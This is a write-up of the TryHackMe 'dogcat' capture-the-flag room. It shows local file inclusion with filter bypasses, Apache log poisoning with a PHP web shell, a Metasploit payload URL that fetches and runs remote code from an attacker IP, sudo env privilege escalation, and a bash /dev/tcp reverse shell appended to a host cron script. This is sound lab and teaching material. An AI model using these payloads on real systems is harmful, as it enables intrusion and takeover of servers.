# TryHackMe-DogCat Write-Up
## Machine's IP = 10.82.133.126
At first I made a rust scan to find open ports:
```bash
rustscan -a 10.82.133.126
```
Two ports are open (22,80). Let's discover the website. This website provide two buttons such as dogs and cats. When we click them, it bring a photo from somewhere. The URL looks like this: http://10.82.133.126/?view=dog. I tried /etc/passwd but got the message like "Sorry, only dogs or cats are allowed". I made a ffuf scan.
```bash
ffuf -u http://10.82.133.126/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 2 -e .php,.txt,.html -ic
```
Its results are: index.php, cat.php, dog.php, flag.php. I tried to read flag.php file (http://10.82.133.126/?view=flag.php) but got nothing in there. Also in the result I saw that it's size is 0. So, I decided to try some LFI payloads. You can check this github repository for getting payloads: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md". The dogcat website works with php. So, i decided to try php filter base64 payload:
```bash
php://filter/convert.base64-encode/resource=index.php
#The last version of URL: http://10.82.133.126/?view=php://filter/convert.base64-encode/resource=index.php
```
----
### Why the initial exploit failed and how I solved it:
I first tried to use the URL ***http://10.82.133.126/?view=php://filter/convert.base64-encode/resource=index.php***, but it did not work.
#### 1. Understanding the Filter:
The website returned an error: "Sorry, only dogs or cats are allowed." This gave me a huge hint. It means the server is checking my input. It only accepts the request if the word "dog" or "cat" is present in the ?view= parameter. When I tried to read /etc/passwd or index.php directly, the filter blocked me because those words were missing.

#### 2. Bypassing the Filter with Path Traversal:
To trick the system, I used the keyword it wanted: dog. But I didn't want to stay in the dog folder. So, I used dog/../.

    The server sees "dog" and thinks: "Okay, this is allowed."
    The operating system sees ../ and thinks: "Go back one directory." This allowed me to "break out" of the restriction while still keeping the filter happy.

#### 3. The Extension Mystery:
Even with dog/../index.php, it still didn't work. I had to think about why. From my ffuf results, I knew the files on the server were index.php, cat.php, and dog.php. However, when I clicked the buttons on the site, the URL was just ?view=dog (without the .php).
This confirmed that the back-end PHP code is automatically adding ".php" to whatever I type.

    My input: index.php
    Server's final path: index.php.php (This file does not exist!)

#### 4. The Success:
The solution was to remove the extension from my command. I used:
```bash
http://10.82.133.126/?view=php://filter/convert.base64-encode/resource=dog/../index
```
By doing this, the server took my index, added .php to it, and correctly found index.php. Because I used the php://filter, it didn't execute the code; instead, it converted it to Base64 and printed it on the screen.
#### Conclusion:
Now I have the source code of index.php in Base64 format. I can decode it to see the actual PHP logic and look for more vulnerabilities or hidden flags!
----
The content of **index.php** file.
```bash
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
#### We already discovered two vulnerability in there: 
1. **Include function** --> LFI
 -- The code passes user-controlled variables ($view and $ext) directly into the include function without sanitization.

2. **ContainStr()** --> Weak Filtering
-- The function only checks if "dog" or "cat" exists anywhere in the string. It does not validate the full path. This allows a Path Traversal attack (e.g., dog/../), where we satisfy the filter but move out of the restricted folder.

But there is also third vulnerability which we learned new from this file: $ext
```bash
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```
This line in the content of index.php file, says that: Normally, the system automatically adds .php to every file you try to open. If you try to read /etc/passwd, the system changes it to /etc/passwd.php, which doesn't exist. 
#### The Weakness:
The code allows us to provide our own extension using the &ext= parameter. If we provide our own, the system stops adding the automatic .php. By adding an empty extension (&ext=) to our URL, we tell the system: "Don't add anything to the end of my file path". So, "/etc/passwd&ext=" = "/etc/passwd"

So, lets use it to read the /etc/passwd file:
```bash
http://10.82.133.126/?view=php://filter/convert.base64-encode/resource=dog/../../../../../../../../../../etc/passwd&ext=
```
----
We can only read files by the help of LFI but It is needed to get a reverse shell. So, I searched about it for a time. I used wappalyzer to see which web-server we use. It is Apache. If there is an Apache server and LFI vulnerability, it means the first thing we need to check is RCE. It is called "Apache Log Poisoning Through LFI". How to do it?  
First, we will try to read the access.log file using LFI. The path for access.log is /var/log/apache2/access.log. We will replace our /etc/passwd with this location to read the log.
```bash
http://10.82.133.126/?view=dog/../../../../../../../var/log/apache2/access.log&ext=
```
<img width="1911" height="1098" alt="Screenshot From 2026-02-16 22-05-05" src="https://github.com/user-attachments/assets/7f138b6f-58db-4d2f-a548-476ba14de420" />
Here, we can see that the log is accessible. Now it’s time to poison it. For this, we will be needing Burp Suite. We will capture the request using Burp Suite. Then we will manipulate the User-Agent. We can see that Default User-Agent in the image below.  
<img width="1029" height="228" alt="Screenshot From 2026-02-16 22-07-12" src="https://github.com/user-attachments/assets/8103c6da-8302-4179-a865-567725732e18" />
We change the User-Agent to introduce a php code that can call on system variables to run system commands. We forward the request to the server.  
<img width="1029" height="249" alt="Screenshot From 2026-02-16 22-14-32" src="https://github.com/user-attachments/assets/927dc766-75ad-49d1-92fe-0bfce69019b8" />  

Yeah as you can see I changed two section:  
```bash
#Request: I added "&c=id" for checking
#Payload: <?php system($_GET['c']); ?>
```  
We can search for "uid" or "www-data" to see the result on the response of our request.
----
Yeah, we already know that we can execute commands. So, we can use metasploit to get RCE. Use this commands:
```bash
use exploit/multi/script/web_delivery
set target 1
set lhost tun0
set srvport 8081
set payload php/meterpreter/reverse_tcp
run
```
It will give us a payload to write after "&c=" to get shell. There is the full url:
```bash
http://10.82.133.126/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://192.168.167.246:8081/6Udc5bpyEps%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22
```  
Yeahh, we successfully get a shell. All we need is to write "sessions -i 1" and then, "shell".  
----
## Flag 1
I got the first flag "flag.php" from /var/www/html folder.

## Flag 2
I used "find / -type f | grep "flag" 2>/dev/null" this command to find the second flag's path because there wasn't anything on home or other directories. It's path is "/var/www/flag2_QMW7JvaY2LvK.txt"

## Flag 3
I tried "sudo -l" and saw "(root) NOPASSWD: /usr/bin/env". In GTFObins it has a vulnerability. By this command we can be root:
```bash
sudo env /bin/sh
```
I am **root** user right now and get the flag3 from there.

## FLAG4
There was a hint about flag4 in the description of CTF --> "break out of a docker container." 
### Privilege Escalation & Container Escape Analysis
After gaining initial access, I confirmed that the environment was a Docker container by inspecting the filesystem and root directory. While my previous actions allowed me to capture flags within the container, the final flag resided on the host server (outside the container).

### The Discovery:
I discovered a directory at /opt/backups containing a shell script named backup.sh. In this specific environment, this folder acts as a "Volume Mount"—a shared window between the isolated container and the host server.

### The Vulnerability:
The backup.sh script is executed periodically by a Cron job on the host machine with root privileges. Because this file is accessible from within the container, it serves as a bridge. By modifying (poisoning) this script with a reverse shell payload, we can force the host server to execute our code.
```bash
echo "bash -i >& /dev/tcp/192.168.167.246/4455 0>&1" >> /opt/backups/backup.sh
```
Don't forget to open a nc connection on another terminal before executing the command above:
```bash
rlwrap nc -nvlp 4455
```
Yeah we get the shell and read the flag4 from this path (/root/flag4.txt)







